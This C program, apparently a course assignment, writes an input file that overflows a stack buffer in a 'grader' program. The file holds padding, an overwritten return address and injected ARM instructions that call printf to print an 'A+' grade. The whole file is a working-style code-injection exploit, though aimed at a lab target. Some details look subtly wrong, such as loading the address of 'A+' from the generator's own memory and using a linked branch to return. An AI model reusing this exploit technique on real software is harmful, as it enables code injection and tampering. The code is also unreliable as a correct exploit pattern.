/*--------------------------------------------------------------------*/
/* File: createdataAplus.c                                            */
/* Purpose: Produces a file called dataAplus that manipulates the     */
/* grader program to print an "A+" grade.                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

int main(void) {
    FILE *dataAplus;
    unsigned int payloadAddress, printfAddress, returnAddress;
    unsigned int ldrInstr, blInstr;

    dataAplus = fopen("dataAplus", "w+");

    /* Write student name and null byte */
    fprintf(dataAplus, "Alex & Matt");
    putc('\0', dataAplus);

    printfAddress = 0x400670; /*Address of printf in grader*/
    returnAddress = 0x4008c0; /* Address to return to after  printing */
    payloadAddress = 0x420100; /* Address where our payload will be located */

    /* Padding to fill buffer and reach return address */
    int i = 0;
    while(i < 64) {
        putc('A', dataAplus);
        i++;
    }

    /* Overwrite return address with the address of our payload */
    fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);

    /* Payload: Set up instructions to print "A+". Load the 
    address of "A+" string into register for printf */
    ldrInstr = MiniAssembler_ldr(0, (unsigned long)"A+"); 
    fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);

    /* Call printf with "A+" string */
    blInstr = MiniAssembler_bl(printfAddress, payloadAddress);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);

    /* Return to normal execution flow after printf */
    blInstr = MiniAssembler_bl(returnAddress, payloadAddress + 8);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);

    fclose(dataAplus);
    return 0;
}
